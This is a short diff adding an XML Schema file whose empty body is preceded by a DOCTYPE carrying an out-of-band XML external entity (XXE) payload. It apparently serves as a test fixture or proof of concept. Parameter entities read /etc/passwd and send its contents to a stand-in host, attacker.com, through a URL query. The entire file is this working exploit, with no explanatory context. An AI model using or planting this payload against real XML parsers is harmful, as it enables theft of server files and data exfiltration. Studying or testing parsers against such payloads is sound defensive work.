@@ -1,0 +1,8 @@
+<!DOCTYPE xs:schema [
+    <!ENTITY % payload SYSTEM "file:///etc/passwd">
+    <!ENTITY % wrapper "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%payload;'>">
+    %wrapper;
+    %exfil;
+]>
+<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
+</xs:schema>
